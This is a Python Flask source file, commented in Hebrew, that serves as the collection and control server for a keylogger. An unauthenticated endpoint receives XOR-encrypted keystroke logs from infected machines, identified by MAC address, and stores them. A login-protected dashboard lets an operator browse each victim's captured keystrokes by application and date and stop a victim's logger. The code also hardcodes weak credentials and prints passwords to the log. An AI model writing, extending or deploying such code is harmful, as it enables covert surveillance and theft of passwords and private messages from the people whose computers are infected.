import flask
from flask import Flask
import os
import json
import time
from flask_cors import CORS
import Encryptor
import flask_login
from flask import Flask, render_template, request, redirect, url_for, jsonify
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user

stop = False
app = Flask(__name__)
CORS(app)
data_file = r"C:\Users\1\Desktop\keylogger\server_data\computers"
app.secret_key = "סוד_מאובטח"  # מפתח להצפנה

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = "login"
# רשימת משתמשים וסיסמאות (כדאי לשמור בעתיד במסד נתונים)
users = {"admin": "password123", "user": "1234"}

# מחלקת משתמשים
class User(UserMixin):
    def __init__(self, username):
        self.id = username

# פונקציה שמטענת משתמש לפי ה-ID
@login_manager.user_loader
def load_user(user_id):
    return User(user_id) if user_id in users else None

# עמוד התחברות
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print(password)
        if username in users and users[username] == password:
            user = User(username)
            login_user(user)
            return redirect(url_for('dashboard'))

    return render_template('index.html')

# עמוד התחברות
@app.route('/', methods=['GET', 'POST'])
def Alogin():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print(password)
        if username in users and users[username] == password:
            user = User(username)
            login_user(user)
            return redirect(url_for('dashboard'))

    return render_template('index.html')
# עמוד מוגן (דשבורד)
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('style_navbar.html', username=current_user.id)


@app.route('/folders', methods=['GET'])
@login_required
def get_folders():
    base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
    try:
        folders = [f for f in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, f))]
    except Exception as e:
        folders = []

    return render_template('list_of_folders.html', folders=folders)




@app.route('/folders/<folder_name>', methods=['GET'])
@login_required
def show_folder_contents(folder_name):
    # מחפש את הנתונים עבור תיקיית ה-MAC
    base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
    files = load_data(mac_address=str(folder_name))

    # יצירת רשימה של התאריכים והקבצים הזמינים
    available_dates = []
    for mac, data in files.items():
        for date in data.keys():
            available_dates.append(date)

    # מחזיר את המידע לתבנית ה-HTML
    return render_template('folder_contents.html', folder_name=folder_name, available_dates=available_dates)

@app.route('/folders/<folder_name>/<from_date>/<last_date>', methods=['GET'])
@login_required
def collect_content_between_files_in_folder( folder_name, from_date, last_date):
    folder_path = rf"C:\Users\1\Desktop\keylogger\server_data\computers\{folder_name}"
    from_date = from_date+ ".json"
    last_date = last_date+ ".json"
    try:
        # קבלת רשימת כל הקבצים שבתיקייה ומיון אלפביתי
        files = sorted(
            [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
        )
    except Exception as e:
        print(f"תקלה בקריאת התיקייה {folder_path}: {e}")
        return ""

    collecting = False
    collected_content = ""

    for file_name in files:
        # מתחילים לאסוף כאשר מגיעים לקובץ עם שם ההתחלה
        if file_name == from_date:
            collecting = True

        if collecting:
            full_path = os.path.join(folder_path, file_name)
            try:
                with open(full_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                    collected_content += content + "\n"
            except Exception as e:
                print(f"תקלה בקריאת הקובץ {file_name}: {e}")

        # בודקים אם הגענו לקובץ עם שם הסיום, ואז עוצרים (אחרי איסוף תוכנו)
        if file_name == last_date and collecting:
            break
    data = process_raw_json_data(collected_content)


    return render_template('from_end_date.html' ,data=data )


@app.route('/folders/<folder_name>/<date>', methods=['GET'])
@login_required
def show_file_data(folder_name, date):
    # טוען את הנתונים עבור תאריך מסוים
    files = load_data(mac_address=str(folder_name), date=date)

    # הצגת המידע של הקובץ
    file_info = []
    for mac, data in files.items():
        if date in data:
            print(f"Found data for {date}.json")  # הדפסת מידע שהנתונים מצורפים לתאריך
            for filename, key_events in data[date].items():
                for time_write, current_app_event in key_events.items():
                    for current_app, events in current_app_event.items():
                        file_info.append({
                            'mac': mac,
                            'filename': filename,
                            'date': time_write,  # כאן ניתן להחזיר את התאריך בצורה מדויקת
                            'app': current_app,
                            'data': events
                        })

    return render_template('file_data.html', folder_name=folder_name, date=date, file_info=file_info)

# עמוד התנתקות
@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


def load_data(mac_address=None, date=None, root_directory=data_file):
        all_data = {}
        # בדיקה שהתיקייה הראשית קיימת
        if not os.path.exists(root_directory):
            return all_data

        for mac in os.listdir(root_directory):
            mac_path = os.path.join(root_directory, mac)
            if not os.path.isdir(mac_path):
                continue

            if mac_address is not None and mac != mac_address:
                continue

            mac_data = {}  # מילון לאחסון הנתונים עבור MAC זה

            # מעבר על כל הקבצים בתיקיית ה-MAC (מחפשים קבצי JSON)
            for filename in os.listdir(mac_path):
                if not filename.endswith(".json"):
                    continue
                # הסרת הסיומת כדי לקבל את התאריך
                file_date = os.path.splitext(filename)[0]

                # אם סופק date והשם (התאריך) לא תואם, דלג
                if date is not None and not file_date.startswith(date):
                    continue

                file_path = os.path.join(mac_path, filename)
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                    mac_data[file_date] = data
                except json.JSONDecodeError:
                    continue

            if mac_data:
                all_data[mac] = mac_data

        return all_data



def process_raw_json_data(raw_data):
    raw_objects = []

    try:
        # חילוק הנתונים בין סוגריים
        objects = raw_data.strip().split('}\n{')

        # סידור מחדש של הסוגריים כדי להחזיר את המבנה
        if objects:
            objects[0] = objects[0] + '}'
            objects[-1] = '{' + objects[-1]
            for i in range(1, len(objects) - 1):
                objects[i] = '{' + objects[i] + '}'

        # המרה לכל אובייקט JSON
        for obj in objects:
            raw_objects.append(json.loads(obj))

        # מיזוג כל האובייקטים לדיקט אחד
        merged_data = {}
        for obj in raw_objects:
            for mac, time_data in obj.items():
                # אם המכשיר (mac) כבר קיים במיזוג, נוסיף את הנתונים החדשים
                if mac not in merged_data:
                    merged_data[mac] = {}

                # מיזוג כל הנתונים לפי זמן
                for time, files in time_data.items():
                    if time not in merged_data[mac]:
                        merged_data[mac][time] = {}

                    for app, events in files.items():
                        # אם האפליקציה כבר קיימת, נוסיף את האירועים
                        if app not in merged_data[mac][time]:
                            merged_data[mac][time][app] = []
                        merged_data[mac][time][app].extend(events)

        return merged_data
    except Exception as e:
        print(f"שגיאה בהמרת הנתונים: {e}")
        return {}

@app.route('/<mac_address>/stop', methods=['GET'])
@login_required
def stop_keylogger(mac_address):
    stop_by_mac_address(mac_address)
    response = {"message": "stop in the next messege to the server:111"}
    return flask.jsonify(response),200





@app.route('/add_data', methods=['POST'])
def upload_data():
    # try:
        # קבלת נתונים כ-JSON
        new_data = flask.request.json
        # print(new_data)
        # אם אין נתונים, מחזירים שגיאה
        if not new_data:
            if chek_if_stop_by_mac_address(new_data):
                return flask.jsonify({'error': "No data received"}), 400

        # הצפנה אם צריך
        decryption = Encryptor.XOREncryptor()
        decrypted_data = decryption.decryption(new_data,"abc")

        # שמירת הנתונים
        save_new_data(decrypted_data)
        # מחזירים הודעת הצלחה


        if chek_if_stop_by_mac_address(decrypted_data):
            return flask.jsonify({'error': "No data received"}), 400

        else:
            return flask.jsonify({'message': 'Save successfully'}), 200

    # except Exception as e:
    #     # במקרה של שגיאה כלשהי, מחזירים הודעת שגיאה
    #     return flask.jsonify({'error': str(e)}), 400


@app.route('/<computers>',methods=['GET'])
@login_required
def get_data(computers,mac_address=None,date=None):
        if not computers:
            return flask.jsonify({'error': 'must get -computers-'}), 400

        data = load_data(mac_address=mac_address, date=date)

        return flask.jsonify(data), 200

def save_new_data(data):
    first_key = (next(iter(data)))
    mac_address = first_key.replace(":" , "-")
    # גישה למפתח השני במילון הפנימי
    second_key = next(iter(data[first_key]))
    date = time.strftime('%d-%m-%Y_%H-%M')
    path = data_file + rf'\{mac_address}'
    # new_data = merge_dicts(old_data,data)
    # print(new_data)
    if not os.path.exists(path):
        os.makedirs(path)
    with open(path+rf"\{date}.json" , "w" , encoding='utf-8') as file:
        json.dump(data , file , indent=4 , ensure_ascii=False)

import json

def get_first_string_from_json(json_content):
    """
    מקבלת מחרוזת JSON ומחזירה את הסטרינג הראשון שנמצא בתוכה.
    אם מדובר במילון, תחזיר את המפתח הראשון אחרי המרת הנקודותיים למקפים.
    """
    def convert_mac_key(key):
        # המרת כתובת MAC עם נקודותיים למקפים
        if isinstance(key, str):
            return key.replace(":", "-")
        return key

    if isinstance(json_content, dict):  # אם זה מילון
        # המרת כל המפתחות של המילון
        json_content = {convert_mac_key(key): value for key, value in json_content.items()}
        for key in json_content.keys():
            if isinstance(key, str):
                return key
        return None

    # אם זה לא מילון, נבצע את ה-JSON.loads() כמו קודם
    try:
        data = json.loads(json_content)
    except json.JSONDecodeError as e:
        print(f"תקלה בפירוש JSON: {e}")
        return None

    # אם מדובר במילון, נשלוף את המפתח הראשון אחרי המרת הנקודותיים למקפים
    if isinstance(data, dict):
        data = {convert_mac_key(key): value for key, value in data.items()}
        for key in data.keys():
            if isinstance(key, str):
                return key
        return None

    # אם מדובר במבנה אחר (למשל, רשימה) ננסה למצוא את הסטרינג הראשון
    elif isinstance(data, list):
        for item in data:
            if isinstance(item, str):
                return item
        return None

    else:
        # במקרה של טיפוס אחר, נבדוק אם עצמו הוא מחרוזת
        if isinstance(data, str):
            return data
        return None





def stop_by_mac_address(mac_address):
    file_path = r"C:\Users\1\Desktop\keylogger\server_data\status_keylogger.json"
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    # עדכון או יצירת המפתח עם הערך False
    data[mac_address] = False

    # כתיבת המילון המעודכן חזרה לקובץ
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def chek_if_stop_by_mac_address(json_data):
    mac_address = get_first_string_from_json(json_data)
    file_path = r"C:\Users\1\Desktop\keylogger\server_data\status_keylogger.json"
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    if data[mac_address] == False:
        return True
    return False

@app.route('/health',methods=['GET'])
def health():
    return flask.jsonify({'status':'server active'}),200


def change_action_to_active():
    file_path = r"C:\Users\1\Desktop\keylogger\server_data\status_keylogger.json"

    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = {}
    # עדכון או יצירת המפתח עם הערך False
    for key , val in data.items():
        print(key)
        print(val)
        data[key] = True

    print(data)
    # כתיבת המילון המעודכן חזרה לקובץ
    with open(file_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)
change_action_to_active()
if __name__ == '__main__':
    app.run(debug=True)










# def merge_dicts(dict_a, dict_b):
#     """
#     ממזג שני מילונים לפי הכללים:
#     1. מפתחות משותפים ממוזגים בהתאם לסוג הערכים.
#     2. מפתחות ייחודיים נשמרים כמות שהם.
#     """
#     print(dict_a)
#     print("aaa")
#     print(dict_b)
#     print("bbb")
#
#     merged = {}
#     # נעבור על מפתחות dict_a
#     for key, val_a in dict_a.items():
#         if key in dict_b:
#             # יש מפתח זהה גם ב-dict_b
#             val_b = dict_b[key]
#             merged[key] = merge_values(val_a, val_b)
#         else:
#             # המפתח קיים רק ב-dict_a
#             merged[key] = val_a
#
#     # נוסיף מפתחות שקיימים רק ב-dict_b
#     for key, val_b in dict_b.items():
#         if key not in dict_a:
#             merged[key] = val_b
#     print(merged)
#     return merged
#
# def merge_values(val_a, val_b):
#     """
#     ממזג שני ערכים בהתאם לסוגם:
#     - אם שניהם dict => מיזוג רקורסיבי.
#     - אם שניהם list => שרשור הרשימות.
#     - אם אחד list והשני לא => הפיכה ל-list ושרשור.
#     - אם שניהם לא list => הפיכתם לרשימה [val_a, val_b].
#     """
#     if isinstance(val_a, dict) and isinstance(val_b, dict):
#         return merge_dicts(val_a, val_b)
#
#     elif isinstance(val_a, list) and isinstance(val_b, list):
#         return val_a + val_b
#
#     elif isinstance(val_a, list) and not isinstance(val_b, list):
#         return val_a + [val_b]
#
#     elif not isinstance(val_a, list) and isinstance(val_b, list):
#         return [val_a] + val_b
#     else:
#         return [val_a, val_b]
#
